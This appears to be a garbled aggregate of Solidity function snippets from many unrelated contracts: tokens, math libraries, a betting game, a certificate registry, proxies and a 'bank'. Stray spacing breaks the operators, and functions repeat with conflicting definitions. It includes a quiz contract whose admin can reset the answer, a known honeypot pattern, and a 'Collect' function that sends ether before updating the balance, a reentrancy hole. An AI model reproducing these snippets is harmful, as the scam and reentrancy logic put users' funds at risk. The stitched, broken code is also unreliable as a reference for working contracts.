function Try (string _response) external payable {
    require (msg.sender = = tx.origin);
    if (responseHash = = keccak256 (_response) & & msg.value > 1 ether) {
        msg.sender.transfer (this.balance);
    }
}

function Start (string _question, string _response) public payable isAdmin {
    if (responseHash = = 0x0) {
        responseHash = keccak256 (_response);
        question = _question;
    }
}

function Stop () public payable isAdmin {
    msg.sender.transfer (this.balance);
}

function New (string _question, bytes32 _responseHash) public payable isAdmin {
    question = _question;
    responseHash = _responseHash;
}

function safeMul (uint256 a, uint256 b) internal returns (uint256) {
    uint256 c = a * b;
    assert (a = = 0 | | c / a = = b);
    return c;
}

function safeDiv (uint256 a, uint256 b) internal returns (uint256) {
    assert (b > 0);
    uint256 c = a / b;
    assert (a = = b * c + a % b);
    return c;
}

function safeSub (uint256 a, uint256 b) internal returns (uint256) {
    assert (b < = a);
    return a - b;
}

function safeAdd (uint256 a, uint256 b) internal returns (uint256) {
    uint256 c = a + b;
    assert (c > = a & & c > = b);
    return c;
}

function assert (bool assertion) internal {
    if (! assertion) {
        throw;
    }
}

function AT (uint256 initialSupply, string tokenName, uint8 decimalUnits, string tokenSymbol) {
    balanceOf [msg.sender] = initialSupply;
    totalSupply = initialSupply;
    name = tokenName;
    symbol = tokenSymbol;
    decimals = decimalUnits;
    owner = msg.sender;
}

function transfer (address _to, uint256 _value) {
    if (_to = = 0x0) throw;
    if (_value < = 0) throw;
    if (balanceOf [msg.sender] < _value) throw;
    if (balanceOf [_to] + _value < balanceOf [_to]) throw;
    balanceOf [msg.sender] = SafeMath.safeSub (balanceOf [msg.sender], _value);
    balanceOf [_to] = SafeMath.safeAdd (balanceOf [_to], _value);
    Transfer (msg.sender, _to, _value);
}

function approve (address _spender, uint256 _value) returns (bool success) {
    if (_value < = 0) throw;
    allowance [msg.sender] [_spender] = _value;
    return true;
}

function transferFrom (address _from, address _to, uint256 _value) returns (bool success) {
    if (_to = = 0x0) throw;
    if (_value < = 0) throw;
    if (balanceOf [_from] < _value) throw;
    if (balanceOf [_to] + _value < balanceOf [_to]) throw;
    if (_value > allowance [_from] [msg.sender]) throw;
    balanceOf [_from] = SafeMath.safeSub (balanceOf [_from], _value);
    balanceOf [_to] = SafeMath.safeAdd (balanceOf [_to], _value);
    allowance [_from] [msg.sender] = SafeMath.safeSub (allowance [_from] [msg.sender], _value);
    Transfer (_from, _to, _value);
    return true;
}

function burn (uint256 _value) returns (bool success) {
    if (balanceOf [msg.sender] < _value) throw;
    if (_value < = 0) throw;
    balanceOf [msg.sender] = SafeMath.safeSub (balanceOf [msg.sender], _value);
    totalSupply = SafeMath.safeSub (totalSupply, _value);
    Burn (msg.sender, _value);
    return true;
}

function freeze (uint256 _value) returns (bool success) {
    if (balanceOf [msg.sender] < _value) throw;
    if (_value < = 0) throw;
    balanceOf [msg.sender] = SafeMath.safeSub (balanceOf [msg.sender], _value);
    freezeOf [msg.sender] = SafeMath.safeAdd (freezeOf [msg.sender], _value);
    Freeze (msg.sender, _value);
    return true;
}

function unfreeze (uint256 _value) returns (bool success) {
    if (freezeOf [msg.sender] < _value) throw;
    if (_value < = 0) throw;
    freezeOf [msg.sender] = SafeMath.safeSub (freezeOf [msg.sender], _value);
    balanceOf [msg.sender] = SafeMath.safeAdd (balanceOf [msg.sender], _value);
    Unfreeze (msg.sender, _value);
    return true;
}

function withdrawEther (uint256 amount) {
    if (msg.sender ! = owner) throw;
    owner.transfer (amount);
}

function totalSupply () public view returns (uint256) {
    return _totalSupply;
}

function balanceOf (address account) public view returns (uint256) {
    return _balances [account];
}

function transfer (address recipient, uint256 amount) public returns (bool) {
    _transfer (msg.sender, recipient, amount);
    return true;
}

function allowance (address owner, address spender) public view returns (uint256) {
    return _allowances [owner] [spender];
}

function approve (address spender, uint256 value) public returns (bool) {
    _approve (msg.sender, spender, value);
    return true;
}

function transferFrom (address sender, address recipient, uint256 amount) public returns (bool) {
    _transfer (sender, recipient, amount);
    _approve (sender, msg.sender, _allowances [sender] [msg.sender].sub (amount, "ERC20: transfer amount exceeds allowance"));
    return true;
}

function increaseAllowance (address spender, uint256 addedValue) public returns (bool) {
    _approve (msg.sender, spender, _allowances [msg.sender] [spender].add (addedValue));
    return true;
}

function decreaseAllowance (address spender, uint256 subtractedValue) public returns (bool) {
    _approve (msg.sender, spender, _allowances [msg.sender] [spender].sub (subtractedValue, "ERC20: decreased allowance below zero"));
    return true;
}

function burn (uint256 amount) public {
    _burn (msg.sender, amount);
}

function _transfer (address sender, address recipient, uint256 amount) internal {
    require (sender ! = address (0), "ERC20: transfer from the zero address");
    require (recipient ! = address (0), "ERC20: transfer to the zero address");
    require (recipient ! = address (this), "ERC20: transfer to the smart contract address");
    _balances [sender] = _balances [sender].sub (amount, "ERC20: transfer amount exceeds balance");
    _balances [recipient] = _balances [recipient].add (amount);
    emit Transfer (sender, recipient, amount);
}

function _mint (address account, uint256 amount) internal {
    require (account ! = address (0), "ERC20: mint to the zero address");
    _totalSupply = _totalSupply.add (amount);
    _balances [account] = _balances [account].add (amount);
    emit Transfer (address (0), account, amount);
}

function _burn (address account, uint256 value) internal {
    require (account ! = address (0), "ERC20: burn from the zero address");
    _balances [account] = _balances [account].sub (value, "ERC20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub (value);
    emit Transfer (account, address (0), value);
}

function _approve (address owner, address spender, uint256 value) internal {
    require (owner ! = address (0), "ERC20: approve from the zero address");
    require (spender ! = address (0), "ERC20: approve to the zero address");
    _allowances [owner] [spender] = value;
    emit Approval (owner, spender, value);
}

function _burnFrom (address account, uint256 amount) internal {
    _burn (account, amount);
    _approve (account, msg.sender, _allowances [account] [msg.sender].sub (amount, "ERC20: burn amount exceeds allowance"));
}

function name () public view returns (string memory) {
    return _name;
}

function symbol () public view returns (string memory) {
    return _symbol;
}

function decimals () public view returns (uint8) {
    return _decimals;
}

function () public payable {
    if (! isOwner (msg.sender)) {
        _deposit (msg.sender, msg.value);
    }
}

function totalBalance () public view returns (uint256) {
    return _totalBalance;
}

function balanceOf (address owner) public view returns (uint256) {
    return _balances [owner];
}

function lockedOf (address owner) public view returns (uint256) {
    return _locked [owner];
}

function lastApplyTime (address owner) public view returns (uint256) {
    return _last_apply_time [owner];
}

function applyAmount (address owner) public view returns (uint256) {
    return _apply_amount [owner];
}

function deal (address gambler, uint256 commit, uint128 amount, uint8 cutCard, uint8 v, bytes32 r, bytes32 s) public onlyCroupier {
    bytes32 signatureHash = keccak256 (abi.encodePacked (amount, cutCard, commit));
    require (gambler = = ecrecover (signatureHash, v, r, s), "ECDSA signature is not valid.");
    _dealCore (gambler, commit, amount, cutCard);
}

function settle (uint256 reveal_1, uint256 reveal_2, bytes11 actions, bool win, uint128 amount) public onlyCroupier {
    uint commit = uint (keccak256 (abi.encodePacked (reveal_1, reveal_2)));
    Bet storage bet = bets [commit];
    address gambler = bet.gambler;
    uint256 value = uint256 (bet.amount);
    require (gambler ! = address (0) & & value > 0, "Bet should be in 'active' state.");
    require (block.number > bet.dealBlockNumber, "Settle in the same block as placeBet, or before.");
    require (block.number < = uint256 (bet.dealBlockNumber).add (expireBlocks), "Bet expired.");
    bet.actions = actions;
    bet.amount = 0;
    uint256 lockValue = value.mul (LOCK_RATIO).div (THIS_DIVISOR);
    _locked [gambler] = _locked [gambler].sub (lockValue);
    if (win) {
        _balances [gambler] = _balances [gambler].add (uint256 (amount));
        _totalBalance = _totalBalance.add (uint256 (amount));
    }
    else {
        _balances [gambler] = _balances [gambler].sub (uint256 (amount));
        _totalBalance = _totalBalance.sub (uint256 (amount));
    }
    emit Settle (commit);
}

function refund (uint256 commit) public onlyCroupier {
    Bet storage bet = bets [commit];
    uint256 value = uint256 (bet.amount);
    address gambler = bet.gambler;
    require (gambler ! = address (0) & & value > 0, "Bet should be in 'active' state.");
    require (block.number > uint256 (bet.dealBlockNumber).add (expireBlocks), "Bet not yet expired.");
    uint256 lockValue = value.mul (LOCK_RATIO).div (THIS_DIVISOR);
    _locked [gambler] = _locked [gambler].sub (lockValue);
    bet.amount = 0;
    emit Refund (commit, uint128 (value));
}

function deposit () public payable returns (bool) {
    _deposit (msg.sender, msg.value);
    return true;
}

function apply (uint256 amount) public returns (bool) {
    require (amount < = _balances [msg.sender].sub (_locked [msg.sender]), "Not enough balance.");
    _last_apply_time [msg.sender] = now;
    _apply_amount [msg.sender] = amount;
    emit Apply (msg.sender, amount);
    return true;
}

function withdraw () public returns (bool) {
    require (_apply_amount [msg.sender] > 0, "");
    require (now > = _last_apply_time [msg.sender].add (statedPeriod), "");
    _withdraw (msg.sender, _apply_amount [msg.sender]);
    _apply_amount [msg.sender] = 0;
    return true;
}

function withdrawProxy (address from) public onlyCroupier returns (bool) {
    uint256 amount = balanceOf (from);
    _withdraw (from, amount);
    return true;
}

function _deposit (address from, uint256 value) internal {
    require (from ! = address (0), "Invalid address.");
    _balances [from] = _balances [from].add (value);
    _totalBalance = _totalBalance.add (value);
    emit Deposit (from, value);
}

function _withdraw (address from, uint256 value) internal {
    require (from ! = address (0), "Invalid address.");
    require (value < = _balances [from].sub (_locked [from]), "Not enough balance.");
    _balances [from] = _balances [from].sub (value);
    _totalBalance = _totalBalance.sub (value);
    uint256 fee = value.mul (feeRatio).div (THIS_DIVISOR);
    require (value.sub (fee) < = address (this).balance, "Can't afford.");
    from.transfer (value.sub (fee));
    emit Withdraw (from, value);
}

function _safeTypeConversion (uint256 a, uint128 b) internal pure returns (bool) {
    require (a = = uint256 (b) & & uint128 (a) = = b, "Not safe type conversion.");
    return true;
}

function _dealCore (address gambler, uint256 commit, uint128 amount, uint8 cutCard) internal {
    Bet storage bet = bets [commit];
    require (bet.gambler = = address (0), "Bet should be in 'clean' state.");
    require (cutCard < = MAX_CUT_CARD, "Cut card position is not valid.");
    uint256 value = uint256 (amount);
    require (_safeTypeConversion (value, amount), "Not safe type conversion");
    require (value > = minBet & & value < = maxBet, "Bet amount is out of range.");
    uint256 lockValue = value.mul (LOCK_RATIO).div (THIS_DIVISOR);
    require (lockValue < = balanceOf (gambler).sub (lockedOf (gambler)), "Balance is not enough for locked.");
    _locked [gambler] = _locked [gambler].add (lockValue);
    bet.gambler = gambler;
    bet.cutCard = cutCard;
    bet.amount = amount;
    bet.dealBlockNumber = uint128 (block.number);
    emit Deal (commit);
}

function setMaxBet (uint256 input) public onlyOwner {
    maxBet = input;
}

function setMinBet (uint256 input) public onlyOwner {
    minBet = input;
}

function setFeeRatio (uint256 input) public onlyOwner {
    feeRatio = input;
}

function setExpireBlocks (uint256 input) public onlyOwner {
    expireBlocks = input;
}

function setStatedPeriod (uint256 input) public onlyOwner {
    statedPeriod = input;
}

function withdrawFunds (uint256 amount) public onlyOwner {
    require (amount < = address (this).balance.sub (_totalBalance), "Not enough funds.");
    msg.sender.transfer (amount);
}

function kill () public onlyOwner {
    require (_totalBalance = = 0, "All of gambler's balances need to be withdrawn.");
    selfdestruct (msg.sender);
}

function addAdmin (address _adminAddress) public onlySuperAdmin {
    isAdmin [_adminAddress] = true;
}

function removeAdmin (address _adminAddress) public onlySuperAdmin {
    isAdmin [_adminAddress] = false;
}

function viewLatestCertificateNumber () public view returns (uint256) {
    return certificateDatabase.length - 1;
}

function getTotalCertificateCount () public view returns (uint256) {
    return certificateDatabase.length;
}

function issueCertificate (uint256 _userId, string memory _name, string memory _course, uint256 _belt, uint256 _percentile) public onlyAdmin returns (uint256) {
    certificateDatabase.push (Certificate ({userID : _userId, name : _name, course : _course, belt : _belt, percentile : _percentile}));
    emit CertificateGenerated (certificateDatabase.length - 1, _userId, _name, _course, _belt, _percentile);
    return certificateDatabase.length - 1;
}

function mul (uint256 a, uint256 b) internal pure returns (uint256) {
    if (a = = 0) {
        return 0;
    }
    uint256 c = a * b;
    require (c / a = = b);
    return c;
}

function div (uint256 a, uint256 b) internal pure returns (uint256) {
    require (b > 0);
    uint256 c = a / b;
    return c;
}

function sub (uint256 a, uint256 b) internal pure returns (uint256) {
    require (b < = a);
    uint256 c = a - b;
    return c;
}

function add (uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require (c > = a);
    return c;
}

function mod (uint256 a, uint256 b) internal pure returns (uint256) {
    require (b ! = 0);
    return a % b;
}

function isConstructor () private view returns (bool) {
    uint256 cs;
    assembly {cs : = extcodesize (address)} return cs = = 0;
}

function admin () external view returns (address) {
    return _admin ();
}

function implementation () external view returns (address impl) {
    bytes32 slot = 0x7050c9e0f4ca769c69bd3a8ef740bc37934f8e2c036e5a723fd8ee048ed3f8c3;
    assembly {impl : = sload (slot)}}

function _admin () internal view returns (address adm) {
    bytes32 slot = ADMIN_SLOT;
    assembly {adm : = sload (slot)}}

function initialize (uint256 _parentBlockInterval) public initializer {
    Period memory genesisPeriod = Period ({height : 1, timestamp : uint32 (block.timestamp), parentBlockNumber : uint32 (block.number), parentBlockHash : blockhash (block.number - 1)});
    tipHash = GENESIS;
    periods [GENESIS] = genesisPeriod;
    genesisBlockNumber = block.number;
    parentBlockInterval = _parentBlockInterval;
    operator = msg.sender;
}

function setOperator (address _operator) public ifAdmin {
    operator = _operator;
    emit NewOperator (_operator);
}

function getParentBlockInterval () public view returns (uint256) {
    return parentBlockInterval;
}

function setParentBlockInterval (uint256 _parentBlockInterval) public ifAdmin {
    parentBlockInterval = _parentBlockInterval;
}

function submitPeriod (bytes32 _prevHash, bytes32 _root) public onlyOperator returns (uint256 newHeight) {
    require (periods [_prevHash].timestamp > 0, "Parent node should exist");
    require (periods [_root].timestamp = = 0, "Trying to submit the same root twice");
    newHeight = periods [_prevHash].height + 1;
    if (newHeight > periods [tipHash].height) {
        require (block.number > = lastParentBlock + parentBlockInterval, "Tried to submit new period too soon");
        tipHash = _root;
        lastParentBlock = block.number;
    }
    emit NewHeight (newHeight, _root);
    Period memory newPeriod = Period ({height : uint32 (newHeight), timestamp : uint32 (block.timestamp), parentBlockNumber : uint32 (block.number), parentBlockHash : blockhash (block.number - 1)});
    periods [_root] = newPeriod;
}

function transfer (address _to, uint _value) returns (bool) {
    if (balances [msg.sender] > = _value & & balances [_to] + _value > = balances [_to]) {
        balances [msg.sender] - = _value;
        balances [_to] + = _value;
        Transfer (msg.sender, _to, _value);
        return true;
    }
    else {
        return false;
    }
}

function transferFrom (address _from, address _to, uint _value) returns (bool) {
    if (balances [_from] > = _value & & allowed [_from] [msg.sender] > = _value & & balances [_to] + _value > = balances [_to]) {
        balances [_to] + = _value;
        balances [_from] - = _value;
        allowed [_from] [msg.sender] - = _value;
        Transfer (_from, _to, _value);
        return true;
    }
    else {
        return false;
    }
}

function balanceOf (address _owner) constant returns (uint) {
    return balances [_owner];
}

function approve (address _spender, uint _value) returns (bool) {
    allowed [msg.sender] [_spender] = _value;
    Approval (msg.sender, _spender, _value);
    return true;
}

function allowance (address _owner, address _spender) constant returns (uint) {
    return allowed [_owner] [_spender];
}

function transferFrom (address _from, address _to, uint _value) public returns (bool) {
    uint allowance = allowed [_from] [msg.sender];
    if (balances [_from] > = _value & & allowance > = _value & & balances [_to] + _value > = balances [_to]) {
        balances [_to] + = _value;
        balances [_from] - = _value;
        if (allowance < MAX_UINT) {
            allowed [_from] [msg.sender] - = _value;
        }
        Transfer (_from, _to, _value);
        return true;
    }
    else {
        return false;
    }
}

function BTToken () {
    balances [msg.sender] = totalSupply;
    Transfer (address (0), msg.sender, totalSupply);
}

function Put (uint _unlockTime) public payable {
    var acc = Acc [msg.sender];
    acc.balance + = msg.value;
    acc.unlockTime = _unlockTime > now ? _unlockTime : now;
    LogFile.AddMessage (msg.sender, msg.value, "Put");
}

function Collect (uint _am) public payable {
    var acc = Acc [msg.sender];
    if (acc.balance > = MinSum & & acc.balance > = _am & & now > acc.unlockTime) {
        if (msg.sender.call.value (_am) ()) {
            acc.balance - = _am;
            LogFile.AddMessage (msg.sender, _am, "Collect");
        }
    }
}

function () public payable {
    Put (0);
}

function c_Bank (address log) public {
    LogFile = Log (log);
}

function AddMessage (address _adr, uint _val, string _data) public {
    LastMsg.Sender = _adr;
    LastMsg.Time = now;
    LastMsg.Val = _val;
    LastMsg.Data = _data;
    History.push (LastMsg);
}

function mul (uint256 a, uint256 b) internal pure returns (uint256) {
    if (a = = 0) {
        return 0;
    }
    uint256 c = a * b;
    require (c / a = = b);
    return c;
}

function div (uint256 a, uint256 b) internal pure returns (uint256) {
    require (b > 0);
    uint256 c = a / b;
    return c;
}

function sub (uint256 a, uint256 b) internal pure returns (uint256) {
    require (b < = a);
    uint256 c = a - b;
    return c;
}

function add (uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require (c > = a);
    return c;
}

function transferOwnership (address _newOwner) public onlyOwner {
    _transferOwnership (_newOwner);
}

function _transferOwnership (address _newOwner) internal {
    require (_newOwner ! = address (0));
    emit OwnershipTransferred (owner, _newOwner);
    owner = _newOwner;
}

function pause () public onlyOwner whenNotPaused {
    paused = true;
    emit Pause ();
}

function unpause () public onlyOwner whenPaused {
    paused = false;
    emit Unpause ();
}

function totalSupply () public view returns (uint256) {
    return totalSupply_;
}

function balanceOf (address _owner) public view returns (uint256) {
    return balances [_owner];
}

function allowance (address _owner, address _spender) public view returns (uint256) {
    return allowed [_owner] [_spender];
}

function transfer (address _to, uint256 _value) public returns (bool) {
    require (_to ! = address (0));
    require (_value < = balances [msg.sender]);
    balances [msg.sender] = balances [msg.sender].sub (_value);
    balances [_to] = balances [_to].add (_value);
    emit Transfer (msg.sender, _to, _value);
    return true;
}

function approve (address _spender, uint256 _value) public returns (bool) {
    allowed [msg.sender] [_spender] = _value;
    emit Approval (msg.sender, _spender, _value);
    return true;
}

function transferFrom (address _from, address _to, uint256 _value) public returns (bool) {
    require (_to ! = address (0));
    require (_value < = balances [_from]);
    require (_value < = allowed [_from] [msg.sender]);
    balances [_from] = balances [_from].sub (_value);
    balances [_to] = balances [_to].add (_value);
    allowed [_from] [msg.sender] = allowed [_from] [msg.sender].sub (_value);
    emit Transfer (_from, _to, _value);
    return true;
}

function increaseApproval (address _spender, uint256 _addedValue) public returns (bool) {
    allowed [msg.sender] [_spender] = allowed [msg.sender] [_spender].add (_addedValue);
    emit Approval (msg.sender, _spender, allowed [msg.sender] [_spender]);
    return true;
}

function decreaseApproval (address _spender, uint256 _subtractedValue) public returns (bool) {
    uint256 oldValue = allowed [msg.sender] [_spender];
    if (_subtractedValue > = oldValue) {
        allowed [msg.sender] [_spender] = 0;
    }
    else {
        allowed [msg.sender] [_spender] = oldValue.sub (_subtractedValue);
    }
    emit Approval (msg.sender, _spender, allowed [msg.sender] [_spender]);
    return true;
}

function burn (uint256 _value) public {
    require (balances [msg.sender] > = _value);
    balances [msg.sender] = balances [msg.sender].sub (_value);
    totalSupply_ = totalSupply_.sub (_value);
    emit Transfer (msg.sender, address (0x00), _value);
    emit Burn (msg.sender, _value);
}

function burnFrom (address _from, uint256 _value) public {
    require (allowed [_from] [msg.sender] > = _value);
    require (balances [_from] > = _value);
    allowed [_from] [msg.sender] = allowed [_from] [msg.sender].sub (_value);
    balances [_from] = balances [_from].sub (_value);
    totalSupply_ = totalSupply_.sub (_value);
    emit Transfer (_from, address (0x00), _value);
    emit Burn (_from, _value);
}

function transfer (address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transfer (_to, _value);
}

function transferFrom (address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {
    return super.transferFrom (_from, _to, _value);
}

function approve (address _spender, uint256 _value) public whenNotPaused returns (bool) {
    return super.approve (_spender, _value);
}

function increaseApproval (address _spender, uint _addedValue) public whenNotPaused returns (bool success) {
    return super.increaseApproval (_spender, _addedValue);
}

function decreaseApproval (address _spender, uint _subtractedValue) public whenNotPaused returns (bool success) {
    return super.decreaseApproval (_spender, _subtractedValue);
}

function frozenCheck (address target) internal view {
    require (! frozenAccount [target]);
}

function freezeAccount (address target, bool frozen) public onlyOwner {
    frozenAccount [target] = frozen;
    emit FrozenAccount (target, frozen);
}

function transfer (address _to, uint256 _value) public returns (bool) {
    frozenCheck (msg.sender);
    frozenCheck (_to);
    return super.transfer (_to, _value);
}

function transferFrom (address _from, address _to, uint256 _value) public whenNotPaused returns (bool) {
    frozenCheck (_from);
    frozenCheck (_to);
    return super.transferFrom (_from, _to, _value);
}

function register (string memory key) public {
    keys [msg.sender] = key;
    emit Register (msg.sender, key);
}

